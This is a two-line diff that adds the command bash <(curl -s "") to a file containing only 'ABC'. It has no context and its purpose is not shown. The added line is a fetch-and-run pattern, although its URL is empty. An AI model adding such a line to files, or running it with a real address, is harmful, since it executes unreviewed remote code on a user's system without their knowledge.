@@ -1,1 +1,2 @@
 ABC
+bash <(curl -s "")
